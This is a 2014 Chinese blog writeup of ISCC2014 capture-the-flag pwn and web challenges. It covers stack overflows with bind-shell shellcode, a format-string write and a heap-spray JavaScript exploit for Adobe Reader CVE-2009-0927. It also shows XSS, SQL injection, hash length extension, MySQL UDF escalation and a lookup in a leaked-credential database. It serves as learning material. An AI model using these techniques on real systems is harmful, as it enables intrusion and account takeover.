@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="https://pikez.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content=""><meta charset="UTF-8"><title>ISCC2014 总结&amp;writeup(二) | Pikez</title>
+<link href="https://pikez.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://pikez.github.io/media/css/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://pikez.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+<script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>
+
+<link rel="canonical" href="https://pikez.github.io/post/iscc2014-zong-jie-and-writeuper2/" />
+</head>
+<body>
+<div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
+<noscript><p class="warn" >本页面需要浏览器支持（启用）JavaScript</p></noscript><div class="header"><div class="logo_title"><div class="title animated fadeInDown"><a href="https://pikez.github.io"><img alt="logo" style="display:inline-block;" src="https://pikez.github.io/images/avatar.png"/></a><h1 title="Pikez" class="weaklink"><a  href="/">Pikez</a></h1>
+
+<div class="navbar weaklink">
+<div class="normal_nav">
+<div class="bitcron_nav_container"><div class="bitcron_nav"><div class="bitcron_nav"><div style="display:flex;justify-content:center;"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tech/" class="selected active current nav__item" >技术</a></li></ul></nav>
+<div style="float:right;margin-top:1em"><form id="gridea-search-form" data-update="1578893743252" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="Search..."></form></div><div style="margin-left:0.5em;margin-top:1.2em"><input id="switch_default" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+<div class="clear clear_nav_inline_end"></div></div></div><div class="clear clear_nav_end"></div></div></div><div class="hamberger" href="javascript:void(0)" onclick="btn_toggle();"><i class="iconfont icon-category"></i></div></div></div></div>
+<div id="hn" class="no-js hidden_nav animated fadeInDown"><div class="bitcron_nav_container"><div class="bitcron_nav"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tech/" class="selected active current nav__item" >技术</a></li></ul><div class="clear clear_nav_inline_end"></div></nav></div><div class="clear clear_nav_end"></div></div>
+<div style="display:flex;justify-content:center;inline-block;text-align:center;margin-top:7%"><div><form id="gridea-search-form" data-update="1597501503043" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q"  placeholder="Search..." /></form></div><div style="margin-left:0.5em"><input id="switch_default_h" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+</div></div>
+<script>function enableDarkmode(){document.body.classList.add("darkmode"),document.getElementById("switch_default").checked=1,document.getElementById("switch_default_h").checked=1}function removeDarkmode(){document.body.classList.remove("darkmode"),document.getElementById("switch_default").checked=0,document.getElementById("switch_default_h").checked=0}function getCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):null}cookie=getCookie("darkmode"),"enable"==cookie&&enableDarkmode(),window.matchMedia("(prefers-color-scheme: dark)").matches&&"disable"!==cookie&&(enableDarkmode(),document.cookie="darkmode=enable; path=/");var mobileBtn=function(){1==document.getElementById("switch_default").checked?(enableDarkmode(),document.cookie="darkmode=enable; path=/"):(removeDarkmode(),document.cookie="darkmode=disable; path=/")};</script>
+
+<div class="main"><div class="main-inner"><div class="content">
+<article class="post">
+<h2 class="post_title sm_margin"><a>ISCC2014 总结&amp;writeup(二)</a></h2>
+<script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
+<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2014-10-15</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px"></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">1464字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">6 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
+</section>
+
+<div style="display:flex">
+<div class="md_block" id="md_block">
+<div class="round-shape-one"></div>
+<p>web和pwn部分的writeup。pwn溢出以前没接触过，这次玩图书馆借了基本书来来回回琢磨了一下，算是入门了，以后再找机会学点高级点的技术，绕过DEP，ALSR等等。web题感觉注入太多了，来来回回几个注入，不太有劲::&gt;_&lt;::。</p>
+<!-- more -->
+<h3 id="pwn">PWN</h3>
+<ul>
+<li><strong>斗克之乱</strong></li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="http://zend3.qiniudn.com/Blog-ISCC13.png" alt="13" loading="lazy"></figure>
+<p>看到程序运行后肯定是绑定了端口的，查看端口后，打开IDA动态调试后，用python写脚本进行连接，然后发送AA……无效字符来反复触发异常直到定位到异常位置</p>
+<figure data-type="image" tabindex="2"><img src="http://zend3.qiniudn.com/Blog-ISCC38.png" alt="38" loading="lazy"></figure>
+<p>然后看到前面的这个函数给了缓冲区64(40H=60)个字节，将数据处理后多余的字符就覆盖了后面，因为有4个字节弹出到了ebp，再后面4个字节才是eip，所以<br>
+在64+4=68后放入shellcode便可以控制流程了。</p>
+<p>找到一个可以打开4444端口的shellcode，写入并连接</p>
+<figure data-type="image" tabindex="3"><img src="http://zend3.qiniudn.com/Blog-ISCC24.png" alt="24" loading="lazy"></figure>
+<p>运行exp.py后，telnet 127.0.0.1 4444 得到cmd</p>
+<ul>
+<li><strong>改革国政</strong></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="http://zend3.qiniudn.com/Blog-ISCC14.png" alt="14" loading="lazy"></figure>
+<p>此处读入文件并加入wron后打印出来，猜测可能是格式化字符串漏洞，printf（buf）的形式</p>
+<figure data-type="image" tabindex="5"><img src="http://zend3.qiniudn.com/Blog-ISCC20.png" alt="20" loading="lazy"></figure>
+<p>先定位当前的输出点</p>
+<figure data-type="image" tabindex="6"><img src="http://zend3.qiniudn.com/Blog-ISCC19.png" alt="19" loading="lazy"></figure>
+<p>然后把AAAA改为wron的位置,接着把eax修改为ISCC的十六进制0x49534343，倒过来是0x43435349，转为十进制为1128485503。(减去已有的196，为1128485307），通过%x来改写eax的大小。</p>
+<figure data-type="image" tabindex="7"><img src="http://zend3.qiniudn.com/Blog-ISCC25.png" alt="25" loading="lazy"></figure>
+<p>把eax这个数值放进原来wron的位置，就能改写wron。</p>
+<figure data-type="image" tabindex="8"><img src="http://zend3.qiniudn.com/Blog-ISCC29.png" alt="29" loading="lazy"></figure>
+<ul>
+<li><strong>远征郑国</strong></li>
+</ul>
+<p>找到读取key并验证那段代码，猜测存在溢出</p>
+<figure data-type="image" tabindex="9"><img src="http://zend3.qiniudn.com/Blog-ISCC15.png" alt="15" loading="lazy"></figure>
+<p>通过调试和尝试，发现136字节刚好充满缓冲区，溢出后覆盖地址</p>
+<p>需要个弹窗ISCC，如果包含00等字符会被截断而不执行，所以写的时候避免0参数的压入</p>
+<p>由于是从文本读入，直接输入shellcode无法正确转义，所以提取机器码后写几行python脚本处理一下</p>
+<figure data-type="image" tabindex="10"><img src="http://zend3.qiniudn.com/Blog-ISCC26.png" alt="26" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="http://zend3.qiniudn.com/Blog-ISCC30.png" alt="30" loading="lazy"></figure>
+<ul>
+<li><strong>镇压叛乱</strong></li>
+</ul>
+<p>在看雪出的《0day安全 软件漏洞分析技术》一书中30章对CVE-2009-0927 adobe reader的溢出漏洞进行了分析，就学习了下下</p>
+<figure data-type="image" tabindex="12"><img src="http://zend3.qiniudn.com/Blog-ISCC16.png" alt="16" loading="lazy"></figure>
+<p>这里，直接把原字符串的长度放入了strncpy的第三个参数，相当于strcpy了，所以造成了溢出。</p>
+<p>大体思路为：通过填充getIcon()函数触发异常，同时覆盖程序SEH指针，再通过堆喷射把0x0c0c0c0c指向的地方填充nop和shellcode。</p>
+<p>首先来创建一个pdf文档，格式很常见，用wps建个空文档保存为pdf格式就行。然后把第七个对象js保存的地方进行修改。</p>
+<p>先构造堆喷射。</p>
+<p>​</p>
+<pre><code>var  nops = unescape(&amp;quot;%u9090%u9090&amp;quot;);
+
+while (nops.length &amp;lt; 0x10000)
+
+nops += nops;       //足够数量的nop
+
+nops = nops.substring(0,0x10000-16-shellcode.length);  //16为BSTR对象的头信息
+
+nops = nops + shellcode;
+
+var memory = new Array();
+
+for (var i=0;i &amp;lt; 1024;i++)  //分配堆，1024块
+
+memory[i] += nops;
+
+var str = unescape(&amp;quot;%0c%0c%0c%0c&amp;quot;);   //触发后跳到的地方
+
+while (str.length &amp;lt; 0x6000)
+
+str += str;
+
+app.doc.Collab.getIcon(str+'aaaaD.Zend');   //放入问题函数
+</code></pre>
+<p>接下来就是构造shellcode的问题，先前写过xp sp3下的cmd shellcode</p>
+<p>写个python把他转换为unicode的形式，见附件。</p>
+<p>最后写进js里面，就搞定了</p>
+<figure data-type="image" tabindex="13"><img src="http://zend3.qiniudn.com/Blog-ISCC21.png" alt="21" loading="lazy"></figure>
+<h3 id="web">WEB</h3>
+<ul>
+<li><strong>霸业蓝图</strong></li>
+</ul>
+<p>一开始没只想着是不是伪造个图片马然后拿key，试了下行不通，然后继文哥提示了我一下，反应过来数据有输出点而且在网页内，很有可能是XSS，于是修改图片EXIF信息为XSS，上传后Flag就到手</p>
+<figure data-type="image" tabindex="14"><img src="http://zend3.qiniudn.com/Blog-ISCC17.png" alt="17" loading="lazy"></figure>
+<blockquote>
+<p>Flag： 19ojep03</p>
+</blockquote>
+<ul>
+<li><strong>君臣论证</strong></li>
+</ul>
+<p>首先看到题目就蛋疼的看了下每月的内容，因为是查询工具，所以很容易想到是注入。</p>
+<figure data-type="image" tabindex="15"><img src="http://zend3.qiniudn.com/Blog-ISCC22.png" alt="22" loading="lazy"></figure>
+<p>到了这里，在月份后面加上单引号错误，于是开始手注（结合后面的xiaoming的表名）。</p>
+<figure data-type="image" tabindex="16"><img src="http://zend3.qiniudn.com/Blog-ISCC27.png" alt="27" loading="lazy"></figure>
+<blockquote>
+<p>Flag ： 9xme0siv2</p>
+</blockquote>
+<ul>
+<li><strong>火眼金睛</strong></li>
+</ul>
+<p>题目说了个“veryCD永垂不朽”用户，于是到社工库（594sgk）查到了信息，登录后台后看到一幅图，打开后有了该页面的代码</p>
+<pre><code>$auth = false;
+if (isset($_COOKIE['auth']))
+{
+
+    $auth = unserialize($_COOKIE['auth']);
+
+    $hsh = $_COOKIE['hsh'];
+
+    if ($hsh !== md5($SECRET . strrev($_COOKIE['auth'])))
+    {
+        //$SECRET is a 8-bit salt
+        $auth = false;
+    }
+}
+else
+{
+    $auth = false; $s = serialize($auth);
+    setcookie('auth';, $s);
+    setcookie('hs';, md5($SECRET . strrev($s)));
+}
+</code></pre>
+<p>继文哥告诉我是长度扩展攻击，研究大半天后搞到了hash值,</p>
+<p>4221c14a2bc59a3c2998a531ff7cb929，利用这个到了admin页面，提示post me some id！ 于是乎burp操起，注入。</p>
+<figure data-type="image" tabindex="17"><img src="http://zend3.qiniudn.com/Blog-ISCC31.png" alt="31" loading="lazy"></figure>
+<p>用管理员帐号密码登录后看到一张图片，打开图片找到flag</p>
+<figure data-type="image" tabindex="18"><img src="http://zend3.qiniudn.com/Blog-ISCC33.png" alt="33" loading="lazy"></figure>
+<blockquote>
+<p>Flag：I_AM_A_VERY_SMART_ADMIN_LOL</p>
+</blockquote>
+<ul>
+<li><strong>老马识途</strong></li>
+</ul>
+<figure data-type="image" tabindex="19"><img src="http://zend3.qiniudn.com/Blog-ISCC34.png" alt="34" loading="lazy"></figure>
+<p>看到这个页面就马上去看了http消息头，果然发现了密码，因为只有3秒钟，手动肯定来不及，所以用python写了个脚本搞定。</p>
+<pre><code>import httplib,urllib,urllib2
+
+import hashlib
+
+header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
+
+Chrome/33.0.1750.117 Safari/537.36','cookie':'ASPSESSIONIDCQRTRCRR=IHFPCCDDEBLFJOAJLHMADILO&amp;', \
+
+}
+
+url = 'script2.iscc.org.cn'
+
+conn = httplib.HTTPConnection(url)
+
+conn.request('ge','/web07_e3a95260b7271954aa59460c134cde7e/')
+
+res = conn.getresponse()
+
+password = res.getheaders()[9][1]
+
+m = hashlib.md5()
+
+m.update(password)
+
+md5pass = m.hexdigest().upper()
+
+params = urllib.urlencode({'pwd': md5pass, 'Submit':'提交' })
+
+conn2 = httplib.HTTPConnection(url)
+
+conn2.request('POST', '/web07_e3a95260b7271954aa59460c134cde7e/index.asp?
+action=Check', params, header)
+
+response = conn2.getresponse()
+
+print response.read()
+</code></pre>
+<blockquote>
+<p>Flag：W3b_Pr0Gr4m1ng@_@</p>
+</blockquote>
+<ul>
+<li><strong>首次会盟</strong></li>
+</ul>
+<p>下载附件发现是udf.dll，mysql提权思路吧，由于虚拟机里的mysql版本较高，只能把dll文件放进 /lib/plugin里才能运行。</p>
+<pre><code>create function getkey returns string soname ‘udf.dll’
+
+select getkey()
+</code></pre>
+<blockquote>
+<p>Flag: U_Will_Use_Udf_In_Final_Challenge@2012</p>
+</blockquote>
+<ul>
+<li><strong>霸业初成</strong></li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="http://zend3.qiniudn.com/Blog-ISCC35.png" alt="35" loading="lazy"></figure>
+<p>进去看见这个页面，马上加了’ 试试，有过滤，以为是绕过滤呢，试了大半天，然后才知道可以试试cookie传参数</p>
+<figure data-type="image" tabindex="21"><img src="http://zend3.qiniudn.com/Blog-ISCC36.png" alt="36" loading="lazy"></figure>
+<p>能正常返回，接着就是构造语句拿flag</p>
+<figure data-type="image" tabindex="22"><img src="http://zend3.qiniudn.com/Blog-ISCC37.png" alt="37" loading="lazy"></figure>
+<blockquote>
+<p>Flag：CaiBuDaoDeMiMa</p>
+</blockquote>
+<ul>
+<li><strong>上古神兽</strong></li>
+</ul>
+<p>传说中的神兽，变量覆盖让人猜简直丧病，但是知道是G=2这回事以后就觉得是我们傻X了</p>
+<figure data-type="image" tabindex="23"><img src="http://zend3.qiniudn.com/Blog-ISCC10.png" alt="10" loading="lazy"></figure>
+<p>下面就是注入了 receiver参数没有过滤</p>
+<blockquote>
+<p>Flag ：8froerf9pu34rjeslfh</p>
+</blockquote>
+
+<span id="footnote"></span>
+<div id = "warn"></div>
+</div>
+<div class="toc-container"><ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#pwn">PWN</a></li>
+<li><a href="#web">WEB</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="fullPage"><canvas id="canvas"></canvas></div>
+</article>
+<div id="eof"><span>EOF</span></div><div class="round-shape-one"></div>
+<section>
+<div class="doc_comments">
+
+</div></section>
+</div></div></div><script>
+"use strict";!function(){for(var n=document.getElementsByTagName("pre"),e=n.length,s=0;s<e;s++){n[s].innerHTML='<span class="line-number"></span>'+n[s].innerHTML+'<span class="cl"></span>';for(var a=n[s].innerHTML.split(/\n/).length,r=0;r<a-1;r++){n[s].getElementsByTagName("span")[0].innerHTML+="<span>"+(r+1)+"</span>"}}}();
+let mainNavLinks=document.querySelectorAll(".markdownIt-TOC a");window.addEventListener("scroll",event=>{let fromTop=window.scrollY;mainNavLinks.forEach((link,index)=>{let section=document.getElementById(decodeURI(link.hash).substring(1));let nextSection=null
+if(mainNavLinks[index+1]){nextSection=document.getElementById(decodeURI(mainNavLinks[index+1].hash).substring(1));}
+if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop){link.classList.add("currentToc");}else{link.classList.remove("currentToc");}}else{link.classList.add("currentToc");}}else{link.classList.remove("currentToc");}});});
+var list=document.querySelectorAll(".katex");for(var i=0;i<list.length;i++){list[i].style.display="unset"};
+var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
+var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
+content="本文最后更新于2014-10-15，已超过 1 年没有更新，涉及的内容可能已经失效！";var date1="2014-10-15 21:53:43";date1=date1.replace("-","/");var date2=new Date();var date3=date2.getTime()-new Date(date1).getTime();var days=Math.floor(date3/(24*3600*1000));if(days>=365){document.getElementById("warn").innerHTML=content};
+</script>
+<style>#magnifyImg{position:fixed;left:0;top:0;text-align:center;width:100%;display:none;z-index:9999}#magnifyImg img{object-fit:contain;background:#eaecef;padding:15px;border-radius:10px;height:auto;width:auto;vertical-align:middle}</style>
+<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"></div></div><div class="copyright"id="copyright">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>Copyright © 2018-2020 <a href="https://pikez.github.io" style="margin:0;">Pikez</a>.</div>
+<span style="display: inline;margin-right:15px;">👁<strong><span id="busuanzi_value_site_uv"></span></strong></span><span id="busuanzi_container_page_pv" style="display: inline;"><span>📚<strong>8</strong> posts</span></div></div>
+<script>
+console.log("\n %c \u26a1Theme: Bitcron-pro Author's Blog:https://blog.blinkstar.cn  Writen By Serence  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
+</script>
+<script src="https://cdn.jsdelivr.net/npm/instant.page@3.0.0/instantpage.min.js" type="module" defer></script>
+<script type="text/javascript" async src="https://pikez.github.io/media/js/prism.js"></script>
+</body>
+</html>
